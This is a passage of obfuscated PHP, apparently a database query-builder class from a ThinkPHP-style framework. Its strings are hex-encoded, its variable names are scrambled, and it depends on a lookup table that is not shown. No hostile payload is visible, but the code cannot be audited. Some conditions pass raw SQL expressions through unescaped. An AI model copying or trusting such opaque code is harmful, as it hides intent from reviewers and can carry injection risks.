"\x4e\117\x54\x20\102\x45\x54\x57\x45\x45\116", "\x6e\x6f\x74\x20\x62\145\x74\x77\145\145\156" => "\x4e\x4f\x54\40\x42\x45\x54\127\105\105\116"); protected $selectSql = "\x53\105\114\105\x43\x54\45\104\111\123\124\x49\x4e\103\124\x25\x20\45\x46\x49\x45\x4c\x44\x25\40\x46\122\117\x4d\x20\45\124\x41\x42\114\105\45\45\x4a\117\111\116\x25\45\x57\x48\x45\122\105\45\x25\x47\122\x4f\x55\x50\x25\45\110\101\x56\111\x4e\x47\x25\45\117\122\x44\x45\x52\45\45\114\x49\x4d\x49\x54\x25\40\45\x55\116\111\117\x4e\x25\x25\x43\117\115\x4d\x45\116\124\x25"; protected $bind = array(); public static function getInstance() { $áïÂ¢à‰ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ß⁄ˆÇ†Œ][1034], $áïÂ¢à‰); } public function factory($î„†¥º = '') { $å˜©Õ¥ÿ =& $_SERVER[ß⁄ˆÇ†Œ]; $î„†¥º = $this->parseConfig($î„†¥º); if (empty($î„†¥º[$å˜©Õ¥ÿ[1035]])) { think_exception(think_lang($å˜©Õ¥ÿ[1036])); } $this->dbType = ucwords(strtolower($î„†¥º[$å˜©Õ¥ÿ[1035]])); $ù¶—Ñ∑¥ = $å˜©Õ¥ÿ[1037] . $this->dbType; if (class_exists($ù¶—Ñ∑¥)) { $—ãŒä¥  = new $ù¶—Ñ∑¥($î„†¥º); if ($å˜©Õ¥ÿ[1038] != strtolower($î„†¥º[$å˜©Õ¥ÿ[1035]])) { $—ãŒä¥ ->dbType = strtoupper($this->dbType); } else { $—ãŒä¥ ->dbType = $this->_getDsnType($î„†¥º[$å˜©Õ¥ÿ[990]]); } } else { think_exception(think_lang($å˜©Õ¥ÿ[1039]) . $å˜©Õ¥ÿ[1040] . $ù¶—Ñ∑¥); } return $—ãŒä¥ ; } public function __call($ÔØèøﬁÖ, $ÑµìóΩ∫) { if (method_exists($this, $ÔØèøﬁÖ)) { return call_user_func_array(array($this, $ÔØèøﬁÖ), $ÑµìóΩ∫); } } protected function _getDsnType($áÆç÷) { $…û®Ñéú = explode($_SERVER[ß⁄ˆÇ†Œ][4], $áÆç÷); $éŒÏŸ”Ó = strtoupper(trim($…û®Ñéú[0])); return $éŒÏŸ”Ó; } private function parseConfig($˝ÒÊÜıò = '') { $ù‘ø≠µ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!empty($˝ÒÊÜıò) && is_string($˝ÒÊÜıò)) { $˝ÒÊÜıò = $this->parseDSN($˝ÒÊÜıò); } elseif (is_array($˝ÒÊÜıò)) { $˝ÒÊÜıò = array_change_key_case($˝ÒÊÜıò); $˝ÒÊÜıò = array($ù‘ø≠µ[1035] => $˝ÒÊÜıò[$ù‘ø≠µ[1041]], $ù‘ø≠µ[962] => $˝ÒÊÜıò[$ù‘ø≠µ[1042]], $ù‘ø≠µ[963] => $˝ÒÊÜıò[$ù‘ø≠µ[1043]], $ù‘ø≠µ[960] => $˝ÒÊÜıò[$ù‘ø≠µ[1044]], $ù‘ø≠µ[961] => $˝ÒÊÜıò[$ù‘ø≠µ[1045]], $ù‘ø≠µ[21] => $˝ÒÊÜıò[$ù‘ø≠µ[1046]], $ù‘ø≠µ[990] => $˝ÒÊÜıò[$ù‘ø≠µ[1047]], $ù‘ø≠µ[17] => isset($˝ÒÊÜıò[$ù‘ø≠µ[1048]]) ? $˝ÒÊÜıò[$ù‘ø≠µ[1048]] : array()); } elseif (empty($˝ÒÊÜıò)) { if (think_config($ù‘ø≠µ[1049]) && $ù‘ø≠µ[1038] != strtolower(think_config($ù‘ø≠µ[1050]))) { $˝ÒÊÜıò = $this->parseDSN(think_config($ù‘ø≠µ[1049])); } else { $˝ÒÊÜıò = array($ù‘ø≠µ[1035] => think_config($ù‘ø≠µ[1050]), $ù‘ø≠µ[962] => think_config($ù‘ø≠µ[1051]), $ù‘ø≠µ[963] => think_config($ù‘ø≠µ[1052]), $ù‘ø≠µ[960] => think_config($ù‘ø≠µ[1053]), $ù‘ø≠µ[961] => think_config($ù‘ø≠µ[1054]), $ù‘ø≠µ[21] => think_config($ù‘ø≠µ[332]), $ù‘ø≠µ[990] => think_config($ù‘ø≠µ[1049]), $ù‘ø≠µ[17] => think_config($ù‘ø≠µ[1055])); } } return $˝ÒÊÜıò; } protected function initConnect($˜Ó˙å¡ = true) { if (1 == think_config($_SERVER[ß⁄ˆÇ†Œ][22])) { $this->_linkID = $this->multiConnect($˜Ó˙å¡); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $†ÓÚ»›à => $äÕÃ∫Éç) { $this->_linkID = $äÕÃ∫Éç; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($î“¡øﬂ◊ = false) { $˛ÚÂﬁ⁄¬ =& $_SERVER[ß⁄ˆÇ†Œ]; static $µ®â≤† = array(); static $≈Ω–¯ºè = -1; if (empty($µ®â≤†)) { foreach ($this->config as $ìœ’é€´ => $˛µ≥Ñ™Ì) { $µ®â≤†[$ìœ’é€´] = explode($˛ÚÂﬁ⁄¬[50], $˛µ≥Ñ™Ì); } } if (think_config($˛ÚÂﬁ⁄¬[1056])) { if ($î“¡øﬂ◊ || think_config($˛ÚÂﬁ⁄¬[479]) === !0) { $Í€„‹î≥ = floor(mt_rand(0, think_config($˛ÚÂﬁ⁄¬[1057]) - 1)); $≈Ω–¯ºè = $Í€„‹î≥; } else { if (is_numeric(think_config($˛ÚÂﬁ⁄¬[1058]))) { $Í€„‹î≥ = think_config($˛ÚÂﬁ⁄¬[1058]); } else { $Í€„‹î≥ = floor(mt_rand(think_config($˛ÚÂﬁ⁄¬[1057]), count($µ®â≤†[$˛ÚÂﬁ⁄¬[960]]) - 1)); } } } else { $Í€„‹î≥ = floor(mt_rand(0, count($µ®â≤†[$˛ÚÂﬁ⁄¬[960]]) - 1)); $≈Ω–¯ºè = $Í€„‹î≥; } $Í€„‹î≥ = $≈Ω–¯ºè !== -1 ? $≈Ω–¯ºè : $Í€„‹î≥; $Á¢∞◊™¬ = array($˛ÚÂﬁ⁄¬[962] => isset($µ®â≤†[$˛ÚÂﬁ⁄¬[962]][$Í€„‹î≥]) ? $µ®â≤†[$˛ÚÂﬁ⁄¬[962]][$Í€„‹î≥] : $µ®â≤†[$˛ÚÂﬁ⁄¬[962]][0], $˛ÚÂﬁ⁄¬[963] => isset($µ®â≤†[$˛ÚÂﬁ⁄¬[963]][$Í€„‹î≥]) ? $µ®â≤†[$˛ÚÂﬁ⁄¬[963]][$Í€„‹î≥] : $µ®â≤†[$˛ÚÂﬁ⁄¬[963]][0], $˛ÚÂﬁ⁄¬[960] => isset($µ®â≤†[$˛ÚÂﬁ⁄¬[960]][$Í€„‹î≥]) ? $µ®â≤†[$˛ÚÂﬁ⁄¬[960]][$Í€„‹î≥] : $µ®â≤†[$˛ÚÂﬁ⁄¬[960]][0], $˛ÚÂﬁ⁄¬[961] => isset($µ®â≤†[$˛ÚÂﬁ⁄¬[961]][$Í€„‹î≥]) ? $µ®â≤†[$˛ÚÂﬁ⁄¬[961]][$Í€„‹î≥] : $µ®â≤†[$˛ÚÂﬁ⁄¬[961]][0], $˛ÚÂﬁ⁄¬[21] => isset($µ®â≤†[$˛ÚÂﬁ⁄¬[21]][$Í€„‹î≥]) ? $µ®â≤†[$˛ÚÂﬁ⁄¬[21]][$Í€„‹î≥] : $µ®â≤†[$˛ÚÂﬁ⁄¬[21]][0], $˛ÚÂﬁ⁄¬[990] => isset($µ®â≤†[$˛ÚÂﬁ⁄¬[990]][$Í€„‹î≥]) ? $µ®â≤†[$˛ÚÂﬁ⁄¬[990]][$Í€„‹î≥] : $µ®â≤†[$˛ÚÂﬁ⁄¬[990]][0], $˛ÚÂﬁ⁄¬[17] => isset($µ®â≤†[$˛ÚÂﬁ⁄¬[17]][$Í€„‹î≥]) ? $µ®â≤†[$˛ÚÂﬁ⁄¬[17]][$Í€„‹î≥] : $µ®â≤†[$˛ÚÂﬁ⁄¬[17]][0]); return $this->connect($Á¢∞◊™¬, $Í€„‹î≥); } public function parseDSN($„¢πú€ô) { $ŸÓ¶ÆÏù =& $_SERVER[ß⁄ˆÇ†Œ]; if (empty($„¢πú€ô)) { return !1; } $õÀÚ∏≠À = parse_url($„¢πú€ô); if ($õÀÚ∏≠À[$ŸÓ¶ÆÏù[207]]) { $≠—˙åÆ = array($ŸÓ¶ÆÏù[1035] => $õÀÚ∏≠À[$ŸÓ¶ÆÏù[207]], $ŸÓ¶ÆÏù[962] => isset($õÀÚ∏≠À[$ŸÓ¶ÆÏù[670]]) ? $õÀÚ∏≠À[$ŸÓ¶ÆÏù[670]] : $ŸÓ¶ÆÏù[12], $ŸÓ¶ÆÏù[963] => isset($õÀÚ∏≠À[$ŸÓ¶ÆÏù[1059]]) ? $õÀÚ∏≠À[$ŸÓ¶ÆÏù[1059]] : $ŸÓ¶ÆÏù[12], $ŸÓ¶ÆÏù[960] => isset($õÀÚ∏≠À[$ŸÓ¶ÆÏù[208]]) ? $õÀÚ∏≠À[$ŸÓ¶ÆÏù[208]] : $ŸÓ¶ÆÏù[12], $ŸÓ¶ÆÏù[961] => isset($õÀÚ∏≠À[$ŸÓ¶ÆÏù[209]]) ? $õÀÚ∏≠À[$ŸÓ¶ÆÏù[209]] : $ŸÓ¶ÆÏù[12], $ŸÓ¶ÆÏù[21] => isset($õÀÚ∏≠À[$ŸÓ¶ÆÏù[87]]) ? substr($õÀÚ∏≠À[$ŸÓ¶ÆÏù[87]], 1) : $ŸÓ¶ÆÏù[12]); } else { preg_match($ŸÓ¶ÆÏù[1060], trim($„¢πú€ô), $Éò°±œ‹); $≠—˙åÆ = array($ŸÓ¶ÆÏù[1035] => $Éò°±œ‹[1], $ŸÓ¶ÆÏù[962] => $Éò°±œ‹[2], $ŸÓ¶ÆÏù[963] => $Éò°±œ‹[3], $ŸÓ¶ÆÏù[960] => $Éò°±œ‹[4], $ŸÓ¶ÆÏù[961] => $Éò°±œ‹[5], $ŸÓ¶ÆÏù[21] => $Éò°±œ‹[6]); } $≠—˙åÆ[$ŸÓ¶ÆÏù[990]] = $ŸÓ¶ÆÏù[12]; return $≠—˙åÆ; } protected function debug() { $·óñ÷•Ë =& $_SERVER[ß⁄ˆÇ†Œ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $·óñ÷•Ë[1061]; if (think_config($·óñ÷•Ë[1062])) { think_status($·óñ÷•Ë[1063]); think_trace($this->queryStr . $·óñ÷•Ë[1064] . think_status($·óñ÷•Ë[24], $·óñ÷•Ë[1063], 6) . $·óñ÷•Ë[1065], $·óñ÷•Ë[12], $·óñ÷•Ë[1066]); } } protected function parseLock($¢˙£ëœ∂ = false) { $à§«‘è„ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$¢˙£ëœ∂) { return $à§«‘è„[12]; } if ($à§«‘è„[992] == $this->dbType) { return $à§«‘è„[1067]; } return $à§«‘è„[1068]; } protected function parseSet($∞œºÖ°Ω) { $ïô…†∑Í =& $_SERVER[ß⁄ˆÇ†Œ]; foreach ($∞œºÖ°Ω as $„Ÿ¶ãë± => $˙ÕÏÇƒã) { if (is_array($˙ÕÏÇƒã) && $ïô…†∑Í[382] == $˙ÕÏÇƒã[0]) { $¬«√óäê[] = $this->parseKey($„Ÿ¶ãë±) . $ïô…†∑Í[958] . $˙ÕÏÇƒã[1]; } elseif (is_scalar($˙ÕÏÇƒã) || is_null($˙ÕÏÇƒã)) { $¬«√óäê[] = $this->parseKey($„Ÿ¶ãë±) . $ïô…†∑Í[958] . $this->parseValue($˙ÕÏÇƒã); } } return $ïô…†∑Í[1069] . implode($ïô…†∑Í[50], $¬«√óäê); } protected function bindParam($ÀÊ‹Õãı, $˚¡ÙÓ€¡) { $this->bind[$_SERVER[ß⁄ˆÇ†Œ][4] . $ÀÊ‹Õãı] = $˚¡ÙÓ€¡; } protected function parseBind($ˆÃÊÊ∫ß) { $ˆÃÊÊ∫ß = array_merge($this->bind, $ˆÃÊÊ∫ß); $this->bind = array(); return $ˆÃÊÊ∫ß; } function parseKey(&$Ë√Ï¨ß, $Æí•¯±Ò = true) { if ($Æí•¯±Ò) { $Ë√Ï¨ß = $this->parseKeyCheck($Ë√Ï¨ß); } return $Ë√Ï¨ß; } function parseKeyCheck($¢‰‰◊ã”) { $¢Ú◊Ê›¸ =& $_SERVER[ß⁄ˆÇ†Œ]; $¢‰‰◊ã” = trim($¢‰‰◊ã”); if (!preg_match($¢Ú◊Ê›¸[1070], $¢‰‰◊ã”)) { think_exception($¢Ú◊Ê›¸[1071] . $¢‰‰◊ã”); } return $¢‰‰◊ã”; } protected function parseValue($ﬂï£ÚŸô) { $§ìı‚∞‚ =& $_SERVER[ß⁄ˆÇ†Œ]; if (is_string($ﬂï£ÚŸô)) { $ﬂï£ÚŸô = $§ìı‚∞‚[1031] . $this->escapeString($ﬂï£ÚŸô) . $§ìı‚∞‚[1031]; } elseif (isset($ﬂï£ÚŸô[0]) && is_string($ﬂï£ÚŸô[0]) && strtolower($ﬂï£ÚŸô[0]) == $§ìı‚∞‚[382]) { $ﬂï£ÚŸô = $this->escapeString($ﬂï£ÚŸô[1]); } elseif (is_array($ﬂï£ÚŸô)) { $ﬂï£ÚŸô = array_map(array($this, $§ìı‚∞‚[1032]), $ﬂï£ÚŸô); } elseif (is_bool($ﬂï£ÚŸô)) { $ﬂï£ÚŸô = $ﬂï£ÚŸô ? $§ìı‚∞‚[91] : $§ìı‚∞‚[228]; } elseif (is_null($ﬂï£ÚŸô)) { $ﬂï£ÚŸô = $§ìı‚∞‚[106]; } return $ﬂï£ÚŸô; } protected function parseField($‚Úä¯∞‡) { $›•◊≤ô´ =& $_SERVER[ß⁄ˆÇ†Œ]; if (is_string($‚Úä¯∞‡) && strpos($‚Úä¯∞‡, $›•◊≤ô´[50])) { $‚Úä¯∞‡ = explode($›•◊≤ô´[50], $‚Úä¯∞‡); } if (is_array($‚Úä¯∞‡)) { $•Œü‹˙ = array(); foreach ($‚Úä¯∞‡ as $ÂﬂëÊÈ« => $¿ØëÔﬁÛ) { if (!is_numeric($ÂﬂëÊÈ«)) { $•Œü‹˙[] = $this->parseKey($ÂﬂëÊÈ«, !1) . $›•◊≤ô´[1072] . $this->parseKey($¿ØëÔﬁÛ); } else { $•Œü‹˙[] = $this->parseKey($¿ØëÔﬁÛ); } } $Ø≤øû§ö = implode($›•◊≤ô´[50], $•Œü‹˙); } elseif (is_string($‚Úä¯∞‡) && !empty($‚Úä¯∞‡)) { $Ø≤øû§ö = $‚Úä¯∞‡; } else { $Ø≤øû§ö = $›•◊≤ô´[220]; } return $Ø≤øû§ö; } protected function parseTable($õü§óºÙ) { $ÌÉÕòÓ· =& $_SERVER[ß⁄ˆÇ†Œ]; if (is_array($õü§óºÙ)) { $⁄¡ä£äõ = array(); foreach ($õü§óºÙ as $¡≈¨ÖË» => $Œ≥œÅ‰«) { if (!is_numeric($¡≈¨ÖË»)) { $⁄¡ä£äõ[] = $this->parseKey($¡≈¨ÖË») . $ÌÉÕòÓ·[53] . $this->parseKey($Œ≥œÅ‰«); } else { $⁄¡ä£äõ[] = $this->parseKey($¡≈¨ÖË»); } } $õü§óºÙ = $⁄¡ä£äõ; } elseif (is_string($õü§óºÙ)) { if (strstr($õü§óºÙ, $ÌÉÕòÓ·[53])) { return $õü§óºÙ; } $õü§óºÙ = explode($ÌÉÕòÓ·[50], $õü§óºÙ); array_walk($õü§óºÙ, array($this, $ÌÉÕòÓ·[980])); } return $ÌÉÕòÓ·[974] . trim(implode($ÌÉÕòÓ·[1073], $õü§óºÙ), $ÌÉÕòÓ·[469]) . $ÌÉÕòÓ·[974]; } protected function parseWhere($ÑÉ˘¢’∞) { $ƒÖı°π =& $_SERVER[ß⁄ˆÇ†Œ]; $»‚≈‘Ïò = $ƒÖı°π[12]; if (is_string($ÑÉ˘¢’∞)) { $»‚≈‘Ïò = $ÑÉ˘¢’∞; } else { $ÍÄì›√ô = isset($ÑÉ˘¢’∞[$ƒÖı°π[1074]]) ? strtoupper($ÑÉ˘¢’∞[$ƒÖı°π[1074]]) : $ƒÖı°π[12]; if (in_array($ÍÄì›√ô, array($ƒÖı°π[1075], $ƒÖı°π[1076], $ƒÖı°π[1077]))) { $ÍÄì›√ô = $ƒÖı°π[53] . $ÍÄì›√ô . $ƒÖı°π[53]; unset($ÑÉ˘¢’∞[$ƒÖı°π[1074]]); } else { $ÍÄì›√ô = $ƒÖı°π[1078]; } foreach ($ÑÉ˘¢’∞ as $›ÙçÅíÔ => $„≠”œ§Ü) { $»‚≈‘Ïò .= $ƒÖı°π[363]; if (is_numeric($›ÙçÅíÔ)) { $›ÙçÅíÔ = $ƒÖı°π[1079]; } if (0 === strpos($›ÙçÅíÔ, $ƒÖı°π[11])) { $»‚≈‘Ïò .= $this->parseThinkWhere($›ÙçÅíÔ, $„≠”œ§Ü); } else { if (!preg_match($ƒÖı°π[1080], trim($›ÙçÅíÔ))) { think_exception(think_lang($ƒÖı°π[1081]) . $ƒÖı°π[4] . $›ÙçÅíÔ); } $≤±Ã˚∞˛ = is_array($„≠”œ§Ü) && isset($„≠”œ§Ü[$ƒÖı°π[1082]]); $›ÙçÅíÔ = trim($›ÙçÅíÔ); if (strpos($›ÙçÅíÔ, $ƒÖı°π[214])) { $›œ”ˆçﬂ = explode($ƒÖı°π[214], $›ÙçÅíÔ); $âÛ≤’ü‹ = array(); foreach ($›œ”ˆçﬂ as $ô”ï•Ã† => $àãúõ€Ω) { $ÜóÈüöñ = $≤±Ã˚∞˛ ? $„≠”œ§Ü[$ô”ï•Ã†] : $„≠”œ§Ü; $âÛ≤’ü‹[] = $ƒÖı°π[346] . $this->parseWhereItem($this->parseKey($àãúõ€Ω), $ÜóÈüöñ) . $ƒÖı°π[979]; } $»‚≈‘Ïò .= implode($ƒÖı°π[1083], $âÛ≤’ü‹); } elseif (strpos($›ÙçÅíÔ, $ƒÖı°π[369])) { $›œ”ˆçﬂ = explode($ƒÖı°π[369], $›ÙçÅíÔ); $âÛ≤’ü‹ = array(); foreach ($›œ”ˆçﬂ as $ô”ï•Ã† => $àãúõ€Ω) { $ÜóÈüöñ = $≤±Ã˚∞˛ ? $„≠”œ§Ü[$ô”ï•Ã†] : $„≠”œ§Ü; $âÛ≤’ü‹[] = $ƒÖı°π[346] . $this->parseWhereItem($this->parseKey($àãúõ€Ω), $ÜóÈüöñ) . $ƒÖı°π[979]; } $»‚≈‘Ïò .= implode($ƒÖı°π[1078], $âÛ≤’ü‹); } else { $»‚≈‘Ïò .= $this->parseWhereItem($this->parseKey($›ÙçÅíÔ), $„≠”œ§Ü); } } $»‚≈‘Ïò .= $ƒÖı°π[364] . $ÍÄì›√ô; } $»‚≈‘Ïò = substr($»‚≈‘Ïò, 0, -strlen($ÍÄì›√ô)); } return empty($»‚≈‘Ïò) ? $ƒÖı°π[12] : $ƒÖı°π[1084] . $»‚≈‘Ïò; } protected function parseWhereItem($∆°ºÇ≠ë, $π˙ÆΩ´¸) { $∏Ô÷ŸÍ„ =& $_SERVER[ß⁄ˆÇ†Œ]; $£æÉé‘í = $∏Ô÷ŸÍ„[12]; if (is_array($π˙ÆΩ´¸)) { if (is_string($π˙ÆΩ´¸[0])) { $œ∏‹’íå = strtolower($π˙ÆΩ´¸[0]); if (in_array($π˙ÆΩ´¸[0], array($∏Ô÷ŸÍ„[958], $∏Ô÷ŸÍ„[1085], $∏Ô÷ŸÍ„[1086], $∏Ô÷ŸÍ„[1087], $∏Ô÷ŸÍ„[1088], $∏Ô÷ŸÍ„[1089]))) { $£æÉé‘í .= $∆°ºÇ≠ë . $∏Ô÷ŸÍ„[53] . $π˙ÆΩ´¸[0] . $∏Ô÷ŸÍ„[53] . $this->parseValue($π˙ÆΩ´¸[1]); } elseif (preg_match($∏Ô÷ŸÍ„[1090], $π˙ÆΩ´¸[0])) { $£æÉé‘í .= $∆°ºÇ≠ë . $∏Ô÷ŸÍ„[53] . $this->exp[$œ∏‹’íå] . $∏Ô÷ŸÍ„[53] . $this->parseValue($π˙ÆΩ´¸[1]); } elseif (preg_match($∏Ô÷ŸÍ„[1091], $π˙ÆΩ´¸[0])) { if (is_array($π˙ÆΩ´¸[1])) { $ùÃ∫⁄ª‰ = isset($π˙ÆΩ´¸[2]) ? strtoupper($π˙ÆΩ´¸[2]) : $∏Ô÷ŸÍ„[1076]; if (in_array($ùÃ∫⁄ª‰, array($∏Ô÷ŸÍ„[1075], $∏Ô÷ŸÍ„[1076], $∏Ô÷ŸÍ„[1077]))) { $Æ÷ˆŸéª = array(); foreach ($π˙ÆΩ´¸[1] as $ŒÙÎ÷≈») { $Æ÷ˆŸéª[] = $∆°ºÇ≠ë . $∏Ô÷ŸÍ„[53] . $this->exp[$œ∏‹’íå] . $∏Ô÷ŸÍ„[53] . $this->parseValue($ŒÙÎ÷≈»); } $£æÉé‘í .= $∏Ô÷ŸÍ„[346] . implode($∏Ô÷ŸÍ„[53] . $ùÃ∫⁄ª‰ . $∏Ô÷ŸÍ„[53], $Æ÷ˆŸéª) . $∏Ô÷ŸÍ„[979]; } } else { $£æÉé‘í .= $∆°ºÇ≠ë . $∏Ô÷ŸÍ„[53] . $this->exp[$œ∏‹’íå] . $∏Ô÷ŸÍ„[53] . $this->parseValue($π˙ÆΩ´¸[1]); } } elseif ($∏Ô÷ŸÍ„[382] == $œ∏‹’íå) { $£æÉé‘í .= $∏Ô÷ŸÍ„[977] . $∆°ºÇ≠ë . $∏Ô÷ŸÍ„[53] . $π˙ÆΩ´¸[1] . $∏Ô÷ŸÍ„[1092]; } elseif (preg_match($∏Ô÷ŸÍ„[1093], $π˙ÆΩ´¸[0])) { $£æÉé‘í .= $π˙ÆΩ´¸[0]; } elseif (preg_match($∏Ô÷ŸÍ„[1094], $π˙ÆΩ´¸[0])) { if (isset($π˙ÆΩ´¸[2]) && $∏Ô÷ŸÍ„[382] == $π˙ÆΩ´¸[2]) { $£æÉé‘í .= $∆°ºÇ≠ë . $∏Ô÷ŸÍ„[53] . $this->exp[$œ∏‹’íå] . $∏Ô÷ŸÍ„[53] . $π˙ÆΩ´¸[1]; } else { if (is_string($π˙ÆΩ´¸[1])) { $π˙ÆΩ´¸[1] = explode($∏Ô÷ŸÍ„[50], $π˙ÆΩ´¸[1]); } $˚ï£û·í = implode($∏Ô÷ŸÍ„[50], $this->parseValue($π˙ÆΩ´¸[1])); $£æÉé‘í .= $∆°ºÇ≠ë . $∏Ô÷ŸÍ„[53] . $this->exp[$œ∏‹’íå] . $∏Ô÷ŸÍ„[977] . $˚ï£û·í . $∏Ô÷ŸÍ„[979]; } } elseif (preg_match($∏Ô÷ŸÍ„[1095], $π˙ÆΩ´¸[0])) { $‹à˙£Í° = is_string($π˙ÆΩ´¸[1]) ? explode($∏Ô÷ŸÍ„[50], $π˙ÆΩ´¸[1]) : $π˙ÆΩ´¸[1]; $£æÉé‘í .= $∏Ô÷ŸÍ„[977] . $∆°ºÇ≠ë . $∏Ô÷ŸÍ„[53] . $this->exp[$œ∏‹’íå] . $∏Ô÷ŸÍ„[53] . $this->parseValue($‹à˙£Í°[0]) . $∏Ô÷ŸÍ„[1078] . $this->parseValue($‹à˙£Í°[1]) . $∏Ô÷ŸÍ„[364]; } else { think_exception(think_lang($∏Ô÷ŸÍ„[1081]) . $∏Ô÷ŸÍ„[4] . $π˙ÆΩ´¸[0]); } } else { $ÄùƒÚÙµ = count($π˙ÆΩ´¸); $πﬁîøŸÖ = $∏Ô÷ŸÍ„[12]; if (is_string($π˙ÆΩ´¸[$ÄùƒÚÙµ - 1])) { $πﬁîøŸÖ = isset($π˙ÆΩ´¸[$ÄùƒÚÙµ - 1]) ? strtoupper($π˙ÆΩ´¸[$ÄùƒÚÙµ - 1]) : $∏Ô÷ŸÍ„[12]; if (in_array($πﬁîøŸÖ, array($∏Ô÷ŸÍ„[1075], $∏Ô÷ŸÍ„[1076], $∏Ô÷ŸÍ„[1077]))) { $ÄùƒÚÙµ = $ÄùƒÚÙµ - 1; } } else { $πﬁîøŸÖ = $∏Ô÷ŸÍ„[1075]; } for ($òß∞π˘ù = 0; $òß∞π˘ù < $ÄùƒÚÙµ; $òß∞π˘ù++) { $‹à˙£Í° = is_array($π˙ÆΩ´¸[$òß∞π˘ù]) ? $π˙ÆΩ´¸[$òß∞π˘ù][1] : $π˙ÆΩ´¸[$òß∞π˘ù]; if ($∏Ô÷ŸÍ„[382] == strtolower($π˙ÆΩ´¸[$òß∞π˘ù][0])) { $£æÉé‘í .= $∏Ô÷ŸÍ„[346] . $∆°ºÇ≠ë . $∏Ô÷ŸÍ„[53] . $‹à˙£Í° . $∏Ô÷ŸÍ„[1092] . $πﬁîøŸÖ . $∏Ô÷ŸÍ„[53]; } else { $âÏ«à¢Ï = is_array($π˙ÆΩ´¸[$òß∞π˘ù]) ? $this->exp[strtolower($π˙ÆΩ´¸[$òß∞π˘ù][0])] : $∏Ô÷ŸÍ„[958]; if (!$âÏ«à¢Ï && is_array($π˙ÆΩ´¸[$òß∞π˘ù]) && in_array($π˙ÆΩ´¸[$òß∞π˘ù][0], array($∏Ô÷ŸÍ„[958], $∏Ô÷ŸÍ„[1085], $∏Ô÷ŸÍ„[1086], $∏Ô÷ŸÍ„[1087], $∏Ô÷ŸÍ„[1088], $∏Ô÷ŸÍ„[1089]))) { $âÏ«à¢Ï = $π˙ÆΩ´¸[$òß∞π˘ù][0]; } $£æÉé‘í .= $∏Ô÷ŸÍ„[346] . $∆°ºÇ≠ë . $∏Ô÷ŸÍ„[53] . $âÏ«à¢Ï . $∏Ô÷ŸÍ„[53] . $this->parseValue($‹à˙£Í°) . $∏Ô÷ŸÍ„[1092] . $πﬁîøŸÖ . $∏Ô÷ŸÍ„[53]; } } $£æÉé‘í = substr($£æÉé‘í, 0, -4); } } else { $£æÉé‘í .= $∆°ºÇ≠ë . $∏Ô÷ŸÍ„[1096] . $this->parseValue($π˙ÆΩ´¸); } return $£æÉé‘í; } protected function parseThinkWhere($∑ßèÁ¸·, $Ø¶≠Ú›ü) { $œ”ÆàÀ =& $_SERVER[ß⁄ˆÇ†Œ]; $ü⁄π„ÕÔ = $œ”ÆàÀ[12]; switch ($∑ßèÁ¸·) { case $œ”ÆàÀ[437]: $ü⁄π„ÕÔ = $Ø¶≠Ú›ü; break; case $œ”ÆàÀ[1079]: $ü⁄π„ÕÔ = is_string($Ø¶≠Ú›ü) ? $Ø¶≠Ú›ü : substr($this->parseWhere($Ø¶≠Ú›ü), 6); break; case $œ”ÆàÀ[1097]: parse_str($Ø¶≠Ú›ü, $‘®ÁáÊ‘); if (isset($‘®ÁáÊ‘[$œ”ÆàÀ[1074]])) { $À§±›Ç∏ = $œ”ÆàÀ[53] . strtoupper($‘®ÁáÊ‘[$œ”ÆàÀ[1074]]) . $œ”ÆàÀ[53]; unset($‘®ÁáÊ‘[$œ”ÆàÀ[1074]]); } else { $À§±›Ç∏ = $œ”ÆàÀ[1078]; } $¿‡”íÃ¨ = array(); foreach ($‘®ÁáÊ‘ as $Â”‡≈Øı => $ê¯œı‰í) { $¿‡”íÃ¨[] = $this->parseKey($Â”‡≈Øı) . $œ”ÆàÀ[1096] . $this->parseValue($ê¯œı‰í); } $ü⁄π„ÕÔ = implode($À§±›Ç∏, $¿‡”íÃ¨); break; } return $ü⁄π„ÕÔ; } protected function parseLimit($¡’⁄Ü‘Ë) { $®Ôø£ó =& $_SERVER[ß⁄ˆÇ†Œ]; return !empty($¡’⁄Ü‘Ë) ? $®Ôø£ó[51] . $¡’⁄Ü‘Ë . $®Ôø£ó[53] : $®Ôø£ó[12]; } protected function parseJoin($›◊Òåã÷) { $éﬂìòå™ =& $_SERVER[ß⁄ˆÇ†Œ]; $ı∞∞†«¨ = $éﬂìòå™[12]; if (!empty($›◊Òåã÷)) { if (is_array($›◊Òåã÷)) { foreach ($›◊Òåã÷ as $…æúÀ´ä => $ºò´ï†Û) { if (!1 !== stripos($ºò´ï†Û, $éﬂìòå™[1098])) { $ı∞∞†«¨ .= $éﬂìòå™[53] . $ºò´ï†Û; } else { $ı∞∞†«¨ .= $éﬂìòå™[1099] . $ºò´ï†Û; } } } else { $ı∞∞†«¨ .= $éﬂìòå™[1099] . $›◊Òåã÷; } } $ı∞∞†«¨ = preg_replace($éﬂìòå™[1100], think_config($éﬂìòå™[1004]) . $éﬂìòå™[1101], $ı∞∞†«¨); return $ı∞∞†«¨; } protected function parseOrder($∏÷”˙ì£) { $∑ª¡Ûø¡ =& $_SERVER[ß⁄ˆÇ†Œ]; if (is_array($∏÷”˙ì£)) { $Ä¡£ãÙï = array(); foreach ($∏÷”˙ì£ as $±§©ŸüÊ => $ì©‚ûƒœ) { if (is_numeric($±§©ŸüÊ)) { $Ä¡£ãÙï[] = $this->parseKey($ì©‚ûƒœ); } else { $ì©‚ûƒœ = in_array(strtoupper(trim($ì©‚ûƒœ)), array($∑ª¡Ûø¡[1102], $∑ª¡Ûø¡[1103])) ? $∑ª¡Ûø¡[53] . $ì©‚ûƒœ : $∑ª¡Ûø¡[12]; if (preg_match($∑ª¡Ûø¡[1104], $±§©ŸüÊ)) { $Ä¡£ãÙï[] = $this->parseKey($±§©ŸüÊ) . $ì©‚ûƒœ; } else { think_exception($∑ª¡Ûø¡[1105] . $±§©ŸüÊ); } } } $∏÷”˙ì£ = implode($∑ª¡Ûø¡[50], $Ä¡£ãÙï); } return !empty($∏÷”˙ì£) ? 